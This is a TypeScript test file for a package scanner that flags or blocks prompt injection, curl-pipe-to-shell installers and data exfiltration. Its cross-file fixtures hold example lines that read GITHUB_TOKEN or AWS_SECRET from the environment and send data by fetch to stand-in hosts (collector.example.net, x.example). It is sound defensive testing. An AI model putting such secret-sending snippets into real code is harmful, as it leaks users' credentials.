import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { scanPackage, computeVerdict } from "./scan-package.js";
import type { Finding } from "./types.js";

const fixtures = join(dirname(fileURLToPath(import.meta.url)), "..", "fixtures");
const scan = (name: string) => scanPackage(join(fixtures, name));

/** Temp package dirs created by makePackage; torn down in afterEach. */
const tempDirs: string[] = [];

/** Materialize an in-memory { relPath: content } map as a real temp package dir. */
function makePackage(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "scan-pkg-"));
  tempDirs.push(root);
  for (const [rel, content] of Object.entries(files)) {
    const full = join(root, rel);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content, "utf8");
  }
  return root;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir) rmSync(dir, { recursive: true, force: true });
  }
});

describe("scanPackage (fixture integration)", () => {
  it("passes a clean package", () => {
    const result = scan("clean");
    expect(result.verdict).toBe("pass");
    expect(result.findings).toHaveLength(0);
  });

  it("blocks an instruction-override prompt injection", () => {
    const result = scan("prompt-injection-high");
    expect(result.verdict).toBe("block");
    expect(result.findings.some((f) => f.category === "prompt-injection" && f.severity === "high")).toBe(true);
  });

  it("flags a role-reassignment prompt injection (med)", () => {
    const result = scan("prompt-injection-med");
    expect(result.verdict).toBe("flag");
    expect(result.findings.every((f) => f.severity !== "high")).toBe(true);
  });

  it("blocks credential read paired with an outbound call", () => {
    const result = scan("exfil-high");
    expect(result.verdict).toBe("block");
    expect(result.findings.some((f) => f.category === "data-exfiltration" && f.severity === "high")).toBe(true);
  });

  it("flags an outbound-only call (med)", () => {
    const result = scan("exfil-med");
    expect(result.verdict).toBe("flag");
    expect(result.findings.every((f) => f.severity !== "high")).toBe(true);
  });

  it("blocks a curl-pipe-to-shell installer", () => {
    const result = scan("malicious-high");
    expect(result.verdict).toBe("block");
    expect(result.findings.some((f) => f.category === "malicious-command" && f.severity === "high")).toBe(true);
  });

  it("flags a raw child_process exec (med)", () => {
    const result = scan("malicious-med");
    expect(result.verdict).toBe("flag");
    expect(result.findings.every((f) => f.severity !== "high")).toBe(true);
  });

  it("reports findings with a 1-indexed line and relative file path", () => {
    const result = scan("malicious-high");
    const finding = result.findings[0];
    expect(finding.line).toBeGreaterThan(0);
    expect(finding.file).not.toContain(fixtures);
  });
});

describe("computeVerdict", () => {
  const f = (severity: Finding["severity"]): Finding => ({
    category: "malicious-command",
    severity,
    file: "x",
    line: 1,
    evidence: "",
  });

  it("returns pass for no findings", () => {
    expect(computeVerdict([])).toBe("pass");
  });
  it("returns flag when the worst is med", () => {
    expect(computeVerdict([f("low"), f("med")])).toBe("flag");
  });
  it("returns block when any high present", () => {
    expect(computeVerdict([f("med"), f("high")])).toBe("block");
  });
});

describe("scanPackage (cross-file exfiltration correlation)", () => {
  it("blocks a package that reads secrets in one file and exfiltrates from another", () => {
    const dir = makePackage({
      "config.js": "export const token = process.env.GITHUB_TOKEN;\n",
      "transport.js":
        'export function send(body) {\n  return fetch("https://collector.example.net/ingest", { method: "POST", body });\n}\n',
    });

    const result = scanPackage(dir);

    expect(result.verdict).toBe("block");
    const crossFile = result.findings.find(
      (f) =>
        f.category === "data-exfiltration" &&
        f.severity === "high" &&
        f.correlatedWith !== undefined,
    );
    expect(crossFile).toBeDefined();
    expect(crossFile?.correlatedWith).toBe("config.js");
    expect(crossFile?.file).toBe("transport.js");
    // The evidence must name BOTH source files so a caller can see the channel.
    expect(crossFile?.evidence).toContain("config.js");
    expect(crossFile?.evidence).toContain("transport.js");
    expect(result.correlatedFindings?.length ?? 0).toBeGreaterThan(0);
  });

  it("keeps a single outbound-only file at flag (no cross-file escalation)", () => {
    const dir = makePackage({
      "ping.js": 'export const ping = () => fetch("https://status.example.com/health");\n',
    });

    const result = scanPackage(dir);

    expect(result.verdict).toBe("flag");
    expect(result.findings.every((f) => f.severity !== "high")).toBe(true);
    expect(result.correlatedFindings).toBeUndefined();
  });

  it("does not synthesize a cross-file finding when secret and outbound share one file", () => {
    const dir = makePackage({
      "index.js": 'const token = process.env.AWS_SECRET;\nfetch("https://x.example/i", { body: token });\n',
    });

    const result = scanPackage(dir);

    // The intra-file heuristic still escalates to high on its own.
    expect(result.verdict).toBe("block");
    expect(
      result.findings.some((f) => f.severity === "high" && f.correlatedWith === undefined),
    ).toBe(true);
    // No cross-file record — the two signals live in the same file.
    expect(result.correlatedFindings).toBeUndefined();
  });

  it("leaves a secret-only package at pass (no outbound to pair with)", () => {
    const dir = makePackage({
      "env.js": "export const key = process.env.GITHUB_TOKEN;\n",
    });

    const result = scanPackage(dir);

    expect(result.verdict).toBe("pass");
    expect(result.correlatedFindings).toBeUndefined();
  });
});
